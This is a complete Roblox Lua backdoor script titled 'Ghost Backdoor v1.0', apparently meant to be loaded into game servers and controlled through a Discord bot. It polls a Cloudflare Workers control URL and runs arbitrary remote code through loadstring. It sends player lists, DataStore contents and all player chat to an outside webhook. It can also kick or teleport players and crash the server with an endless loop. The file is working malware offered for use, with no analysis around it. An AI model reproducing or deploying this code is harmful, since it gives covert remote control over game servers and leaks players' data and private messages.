-- Ghost Backdoor v1.0
-- Loaded via loadstring from GitHub
-- Control via Discord bot: !cmd <command>

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local TeleportService = game:GetService("TeleportService")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local CONTROL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"
local POLL_INTERVAL = 10

local active = true
local chatSpyActive = false

local function send(title, desc, color)
    pcall(function()
        HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
            embeds = {{
                title = title,
                description = tostring(desc):sub(1, 1900),
                color = color or 65535,
                footer = { text = "Ghost Backdoor v1.0" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }), Enum.HttpContentType.ApplicationJson)
    end)
end

local function execCode(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, result = pcall(fn)
        if ok then
            send("EXEC RESULT", "**Code:**\n```lua\n" .. tostring(code):sub(1,500) .. "```\n**Result:** " .. tostring(result), 65280)
        else
            send("EXEC ERROR", "**Code:**\n```lua\n" .. tostring(code):sub(1,500) .. "```\n**Error:** " .. tostring(result), 16711680)
        end
    else
        send("EXEC PARSE ERROR", "**Error:** " .. tostring(err), 16711680)
    end
end

local function kickPlayer(name, reason)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            p:Kick(reason or "Kicked.")
            send("PLAYER KICKED", "**Player:** " .. p.Name .. "\n**Reason:** " .. tostring(reason), 16711680)
            return
        end
    end
    send("KICK FAILED", "Player not found: " .. tostring(name), 16711680)
end

local function listPlayers()
    local list = ""
    for _, p in ipairs(Players:GetPlayers()) do
        list = list .. "\n- **" .. p.Name .. "** (ID: " .. tostring(p.UserId) .. ", Age: " .. tostring(p.AccountAge) .. "d)"
    end
    send("PLAYER LIST",
        "**Game:** " .. tostring(game.PlaceId) ..
        "\n**Job:** " .. tostring(game.JobId) ..
        "\n**Players:**" .. list,
        65535)
end

local function dumpDataStores(storeName)
    storeName = storeName or "PlayerData"
    local results = ""
    local store = nil
    pcall(function() store = DataStoreService:GetDataStore(storeName) end)
    if not store then
        send("DUMP FAILED", "Could not open store: " .. storeName, 16711680)
        return
    end
    for _, p in ipairs(Players:GetPlayers()) do
        pcall(function()
            local data = store:GetAsync(tostring(p.UserId))
            results = results .. "\n**" .. p.Name .. ":** " .. tostring(HttpService:JSONEncode(data)):sub(1, 300)
        end)
    end
    send("DATASTORE DUMP", "**Store:** " .. storeName .. "\n" .. results, 16776960)
end

local function startChatSpy()
    if chatSpyActive then
        send("CHAT SPY", "Already active.", 16776960)
        return
    end
    chatSpyActive = true
    for _, p in ipairs(Players:GetPlayers()) do
        p.Chatted:Connect(function(msg)
            pcall(function()
                send("CHAT SPY", "**" .. p.Name .. ":** " .. msg, 8388736)
            end)
        end)
    end
    Players.PlayerAdded:Connect(function(p)
        p.Chatted:Connect(function(msg)
            pcall(function()
                send("CHAT SPY", "**" .. p.Name .. ":** " .. msg, 8388736)
            end)
        end)
    end)
    send("CHAT SPY", "Now spying on all player chat.", 65280)
end

local function crashServer()
    send("SERVER CRASH", "Crashing now...", 16711680)
    task.wait(1)
    while true do
        Instance.new("Part").Parent = workspace
    end
end

local function teleportPlayer(name, placeId)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            pcall(function()
                TeleportService:Teleport(tonumber(placeId), p)
                send("TELEPORT", "**Player:** " .. p.Name .. "\n**Place:** " .. tostring(placeId), 65280)
            end)
            return
        end
    end
    send("TELEPORT FAILED", "Player not found: " .. tostring(name), 16711680)
end

local function giveTool(name, toolName)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == name:lower() then
            pcall(function()
                local tool = game:GetService("ServerStorage"):FindFirstChild(toolName)
                    or workspace:FindFirstChild(toolName)
                if tool then
                    tool:Clone().Parent = p.Backpack
                    send("TOOL GIVEN", "**Player:** " .. p.Name .. "\n**Tool:** " .. toolName, 65280)
                else
                    send("TOOL FAILED", "Tool not found: " .. toolName, 16711680)
                end
            end)
            return
        end
    end
end

local function parseCommand(cmd)
    if not cmd or cmd == "" then return end
    cmd = cmd:match("^%s*(.-)%s*$")

    if cmd:sub(1,5) == "exec:" then
        execCode(cmd:sub(6))
    elseif cmd:sub(1,5) == "kick:" then
        local name, reason = cmd:sub(6):match("^(.-)%s*|%s*(.*)$")
        if name then kickPlayer(name, reason) else kickPlayer(cmd:sub(6)) end
    elseif cmd == "players" then
        listPlayers()
    elseif cmd:sub(1,5) == "dump:" then
        dumpDataStores(cmd:sub(6))
    elseif cmd == "dump" then
        dumpDataStores()
    elseif cmd == "chatspy" then
        startChatSpy()
    elseif cmd == "crash" then
        crashServer()
    elseif cmd:sub(1,9) == "teleport:" then
        local name, placeId = cmd:sub(10):match("^(.-)%s*|%s*(.*)$")
        if name and placeId then teleportPlayer(name, placeId) end
    elseif cmd:sub(1,5) == "give:" then
        local name, toolName = cmd:sub(6):match("^(.-)%s*|%s*(.*)$")
        if name and toolName then giveTool(name, toolName) end
    elseif cmd == "stop" then
        active = false
        send("BACKDOOR STOPPED", "Deactivated remotely.", 16711680)
    elseif cmd == "start" then
        active = true
        send("BACKDOOR STARTED", "Reactivated remotely.", 65280)
    elseif cmd == "ping" then
        send("PONG",
            "**Game:** " .. tostring(game.PlaceId) ..
            "\n**Job:** " .. tostring(game.JobId) ..
            "\n**Players:** " .. tostring(#Players:GetPlayers()),
            65280)
    end
end

local function startPoller()
    task.spawn(function()
        while true do
            task.wait(POLL_INTERVAL)
            pcall(function()
                local response = HttpService:GetAsync(CONTROL)
                if response and response ~= "" then
                    local data = HttpService:JSONDecode(response)
                    if data then
                        if data.active ~= nil then active = data.active end
                        if data.command and data.command ~= "" then
                            parseCommand(data.command)
                        end
                    end
                end
            end)
        end
    end)
end

-- Init
local gameName = "Unknown"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

send("GHOST BACKDOOR LOADED",
    "**Game:** " .. tostring(gameName) ..
    "\n**Place ID:** " .. tostring(game.PlaceId) ..
    "\n**Job ID:** " .. tostring(game.JobId) ..
    "\n**Players:** " .. tostring(#Players:GetPlayers()) ..
    "\n**Status:** Active. Polling every " .. tostring(POLL_INTERVAL) .. "s.",
    65280
)

startPoller()
